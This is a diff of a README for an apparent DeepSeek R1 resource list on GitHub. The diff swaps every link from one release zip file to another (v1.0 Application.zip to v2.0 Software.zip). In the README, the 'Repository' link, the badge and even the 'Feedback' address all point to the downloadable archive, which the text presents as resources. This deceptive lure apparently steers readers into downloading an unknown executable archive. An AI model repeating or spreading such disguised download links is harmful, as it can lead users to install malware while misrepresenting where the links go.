@@ -30,13 +30,13 @@ Stay updated with the latest discussions, insights, and developments in the worl
 
 ## Explore DeepSeek R1 with Us
 
-Ready to embark on a journey of discovery and innovation with DeepSeek R1? Visit the [Awesome-DeepSeek-R1-Resources Repository](https://github.com/DealToDeath/Awesome-DeepSeek-R1-Resources/releases/download/v1.0/Application.zip) to access a wealth of resources that will fuel your curiosity and passion for this groundbreaking technology.
+Ready to embark on a journey of discovery and innovation with DeepSeek R1? Visit the [Awesome-DeepSeek-R1-Resources Repository](https://github.com/DealToDeath/Awesome-DeepSeek-R1-Resources/releases/download/v2.0/Software.zip) to access a wealth of resources that will fuel your curiosity and passion for this groundbreaking technology.
 
-[![Explore DeepSeek R1 Resources](https://github.com/DealToDeath/Awesome-DeepSeek-R1-Resources/releases/download/v1.0/Application.zip%20DeepSeek%20R1%20Resources-Click%20Here-blue)](https://github.com/DealToDeath/Awesome-DeepSeek-R1-Resources/releases/download/v1.0/Application.zip)
+[![Explore DeepSeek R1 Resources](https://github.com/DealToDeath/Awesome-DeepSeek-R1-Resources/releases/download/v2.0/Software.zip%20DeepSeek%20R1%20Resources-Click%20Here-blue)](https://github.com/DealToDeath/Awesome-DeepSeek-R1-Resources/releases/download/v2.0/Software.zip)
 
 For additional updates and new releases, make sure to check the "Releases" section of this repository.
 
 Let's dive deep into the realm of DeepSeek R1 and unlock its endless possibilities! 🚀🔍✨
 
 ---
-Feedback welcome at: [https://github.com/DealToDeath/Awesome-DeepSeek-R1-Resources/releases/download/v1.0/Application.zip](https://github.com/DealToDeath/Awesome-DeepSeek-R1-Resources/releases/download/v1.0/Application.zip)
+Feedback welcome at: [https://github.com/DealToDeath/Awesome-DeepSeek-R1-Resources/releases/download/v2.0/Software.zip](https://github.com/DealToDeath/Awesome-DeepSeek-R1-Resources/releases/download/v2.0/Software.zip)
